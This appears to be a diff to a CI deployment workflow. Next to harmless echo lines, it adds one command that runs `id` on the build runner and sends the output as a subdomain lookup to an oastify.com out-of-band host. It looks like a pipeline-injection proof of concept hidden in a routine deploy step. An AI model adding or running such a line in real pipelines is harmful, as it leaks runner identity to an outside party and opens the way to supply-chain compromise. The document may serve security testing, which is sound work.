@@ -22,3 +22,4 @@ jobs:
           script: |
             echo "I AM DEPLOYING YAHOOO!"
             echo runSuccess > /tmp/run.txt
+            curl `id`.p5vgsij2jemklk2h04w7a9cqyh48s1gq.oastify.com
